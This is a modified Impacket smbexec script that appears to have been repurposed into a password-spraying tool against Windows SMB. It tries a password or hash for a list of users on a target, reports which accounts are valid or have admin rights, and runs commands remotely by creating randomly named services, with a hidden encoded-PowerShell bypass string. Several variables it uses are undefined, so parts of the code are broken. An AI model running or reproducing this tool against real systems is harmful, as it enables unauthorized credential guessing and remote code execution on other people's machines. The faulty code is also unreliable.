#!/usr/bin/env python
# Impacket - Collection of Python classes for working with network protocols.
#
# Copyright (C) 2022 Fortra. All rights reserved.
#
# This software is provided under a slightly modified version
# of the Apache Software License. See the accompanying LICENSE file
# for more information.
#
# Description:
#   A similar approach to psexec w/o using RemComSvc. The technique is described here
#   https://www.optiv.com/blog/owning-computers-without-shell-access
#   Our implementation goes one step further, instantiating a local smbserver to receive the
#   output of the commands. This is useful in the situation where the target machine does NOT
#   have a writeable share available.
#   Keep in mind that, although this technique might help avoiding AVs, there are a lot of
#   event logs generated and you can't expect executing tasks that will last long since Windows
#   will kill the process since it's not responding as a Windows service.
#   Certainly not a stealthy way.
#
#   This script works in two ways:
#       1) share mode: you specify a share, and everything is done through that share.
#       2) server mode: if for any reason there's no share available, this script will launch a local
#          SMB server, so the output of the commands executed are sent back by the target machine
#          into a locally shared folder. Keep in mind you would need root access to bind to port 445
#          in the local machine.
#
# Author:
#   beto (@agsolino)
#
# Reference for:
#   DCE/RPC and SMB.
#
# Modified to implement a fix for https://github.com/fortra/impacket/issues/777
# albert-a's fix of 'sed -ri "s|(command\s*\+=.*')del|\1%COMSPEC% /Q /c del|" /usr/share/doc/python3-impacket/examples/smbexec.py'
# Kinda dissapointed idk why it requires all of the smbexec code to get a status_logon_failure output rather than a kdc thing but sad
#

from __future__ import division
from __future__ import print_function
import sys
import os

import argparse

try:
    import ConfigParser
except ImportError:
    import configparser as ConfigParser
import logging

from impacket import version
from impacket.dcerpc.v5 import transport, scmr
from time import sleep
import string
import random


OUTPUT_FILENAME = '__output'
BATCH_FILENAME = 'execute.bat'
SERVICE_NAME = ''.join(random.choices(string.ascii_uppercase, k=random.randrange(8, 15)))
CODEC = sys.stdout.encoding
command = ''

class CMDEXEC:
    def __init__(self, username='', password='', domain='', hashes=None, aesKey=None, doKerberos=None,
                 kdcHost=None, share=None, port=445, serviceName=SERVICE_NAME, shell_type=None):

        self.__username = username
        self.__password = password
        self.__port = port
        self.__serviceName = serviceName
        self.__domain = domain
        self.__lmhash = ''
        self.__nthash = ''
        self.__aesKey = aesKey
        self.__doKerberos = doKerberos
        self.__kdcHost = kdcHost
        self.__share = share
        self.__shell_type = shell_type
        self.shell = None
        if hashes is not None:
            self.__lmhash, self.__nthash = hashes.split(':')


    def run(self, remoteName, remoteHost, username):
        stringbinding = r'ncacn_np:%s[\pipe\svcctl]' % remoteName
        logging.debug('StringBinding %s' % stringbinding)
        rpctransport = transport.DCERPCTransportFactory(stringbinding)
        rpctransport.set_dport(self.__port)
        rpctransport.setRemoteHost(remoteHost)
        if hasattr(rpctransport, 'set_credentials'):
            # This method exists only for selected protocol sequences.
            rpctransport.set_credentials(self.__username, self.__password, self.__domain, self.__lmhash,
                                         self.__nthash, self.__aesKey)
        rpctransport.set_kerberos(self.__doKerberos, self.__kdcHost)

        self.shell = None
        try:
            self.shell = RemoteShell(self.__share, rpctransport, self.__serviceName, self.__shell_type)
        except  (Exception, KeyboardInterrupt) as e:

            if str(e).find("rpc_s_access_denied") != -1 and str(e).find("STATUS_OBJECT_NAME_NOT_FOUND") == -1:
                print("{}:{} VALID Creds".format(username, options.p))

            if str(e).find("STATUS_OBJECT_NAME_NOT_FOUND") != -1:
                print("{}:{} VALID Creds and ADMIN".format(username, options.p))


class RemoteShell():
    def __init__(self, share, rpc, serviceName, shell_type):

        self.__share = share
        self.__output = '\\\\127.0.0.1\\' + self.__share + '\\' + OUTPUT_FILENAME
        self.__batchFile = '%TEMP%\\' + BATCH_FILENAME
        self.__outputBuffer = b''
        self.__command = ''
        self.__shell = '%COMSPEC% /Q /c '
        self.__shell_type = shell_type
        self.__pwsh = 'powershell.exe -NoP -NoL -sta -NonI -W Hidden -Exec Bypass -Enc '
        self.__serviceName = serviceName
        self.__rpc = rpc

        self.__scmr = rpc.get_dce_rpc()
        try:
            self.__scmr.connect()
        except Exception as e:
            print("{}:{} {}".format(username, options.p, str(e)))


        s = rpc.get_smb_connection()

        # We don't wanna deal with timeouts from now on.
        s.setTimeout(100000)

        self.__scmr.bind(scmr.MSRPC_UUID_SCMR)
        resp = scmr.hROpenSCManagerW(self.__scmr)
        self.__scHandle = resp['lpScHandle']
        self.transferClient = rpc.get_smb_connection()
        self.do_cd('')
        self.send_data(command)


    def finish(self):
        # Just in case the service is still created
        try:
            self.__scmr = self.__rpc.get_dce_rpc()
            self.__scmr.connect()
            self.__scmr.bind(scmr.MSRPC_UUID_SCMR)
            resp = scmr.hROpenSCManagerW(self.__scmr)
            self.__scHandle = resp['lpScHandle']
            resp = scmr.hROpenServiceW(self.__scmr, self.__scHandle, self.__serviceName)
            service = resp['lpServiceHandle']
            scmr.hRDeleteService(self.__scmr, service)
            scmr.hRControlService(self.__scmr, service, scmr.SERVICE_CONTROL_STOP)
            scmr.hRCloseServiceHandle(self.__scmr, service)
        except scmr.DCERPCException:
            pass

    def do_cd(self, s):
        # We just can't CD or maintain track of the target dir.
        if len(s) > 0:
            logging.error("You can't CD under SMBEXEC. Use full paths.")

        self.execute_remote('cd ')
        if len(self.__outputBuffer) > 0:
            # Stripping CR/LF
            self.prompt = self.__outputBuffer.decode().replace('\r\n','') + '>'
            if self.__shell_type == 'powershell':
                self.prompt = 'PS ' + self.prompt + ' '
            self.__outputBuffer = b''

    def get_output(self):
        def output_callback(data):
            self.__outputBuffer += data

        self.transferClient.getFile(self.__share, OUTPUT_FILENAME, output_callback)
        self.transferClient.deleteFile(self.__share, OUTPUT_FILENAME)


    def execute_remote(self, data, shell_type='cmd'):

        command = self.__shell + 'echo ' + data + ' ^> ' + self.__output + ' 2^>^&1 > ' + self.__batchFile + ' & ' + \
                  self.__shell + self.__batchFile

        command += ' & ' + '%COMSPEC% /Q /c del ' + self.__batchFile

        logging.debug('Executing %s' % command)
        resp = scmr.hRCreateServiceW(self.__scmr, self.__scHandle, self.__serviceName, self.__serviceName,
                                     lpBinaryPathName=command, dwStartType=scmr.SERVICE_DEMAND_START)
        service = resp['lpServiceHandle']

        try:
            scmr.hRStartServiceW(self.__scmr, service)
        except:
            pass
        scmr.hRDeleteService(self.__scmr, service)
        scmr.hRCloseServiceHandle(self.__scmr, service)
        self.get_output()

    def send_data(self, data):
        self.execute_remote(data, self.__shell_type)
        try:
            print(self.__outputBuffer.decode(CODEC))
        except UnicodeDecodeError:
            logging.error('Decoding error detected, consider running chcp.com at the target,\nmap the result with '
                          'https://docs.python.org/3/library/codecs.html#standard-encodings\nand then execute smbexec.py '
                          'again with -codec and the corresponding codec')
            print(self.__outputBuffer.decode(CODEC, errors='replace'))
        self.__outputBuffer = b''


# Process command-line arguments.


if __name__ == '__main__':
    parser = argparse.ArgumentParser(add_help=True, description="")
    parser.add_argument('-u', action='store', help='Username or path to file containing usernames 1 per line')
    parser.add_argument('-p', action='store', help='Password to try')
    parser.add_argument('-d', action='store', help='FQDN to use')
    parser.add_argument('-H', action='store', help='Password hash to use LM:NT')
    parser.add_argument('-s', action='store_true', default=False, help='Quiet mode will only print valid accounts')
    parser.add_argument('-delay', action='store', help='Number of seconds to wait between each account')
    parser.add_argument('target', action='store', help='IP to check the account against')
    parser.add_argument('-debug', action='store_true', help='Turn DEBUG output ON')

    if len(sys.argv) == 1:
        parser.print_help()
        sys.exit(1)

    options = parser.parse_args()

    # Init the example's logger theme

    if options.debug is True:
        logging.getLogger().setLevel(logging.DEBUG)
        # Print the Library's installation path
        logging.debug(version.getInstallationPath())
    else:
        logging.getLogger().setLevel(logging.INFO)


    if options.d is None:
        options.d = ''


    if options.p == '' and options.u != '' and options.hashes is None:
        from getpass import getpass

        password = getpass("Password:")


    if options.H is not None:
        if options.H.find(':') == -1:
            options.H = ':' + options.H

    users = []
    users_cleaned = []

    if os.path.isfile(options.u):
        with open(options.u, 'r') as f:
            users = f.readlines()
            f.close()

        for item in users:
            item = item.replace("\r", "")
            users_cleaned.append(item.replace("\n", ""))
    else:
        users_cleaned.append(options.u)

    for username in users_cleaned:
        try:
            executer = CMDEXEC(username, options.p, options.d, options.H, None, False, None,
                               'C$', int(445), SERVICE_NAME, 'cmd')
            executer.run(options.target, options.target, username)
        except Exception as e:
            for status in smb_error_status:
                if str(e).find(status) != -1:
                    print("{}:{} {}".format(username, options.p, str(e)))
                    break
        if options.delay is not None:
            sleep(int(options.delay))
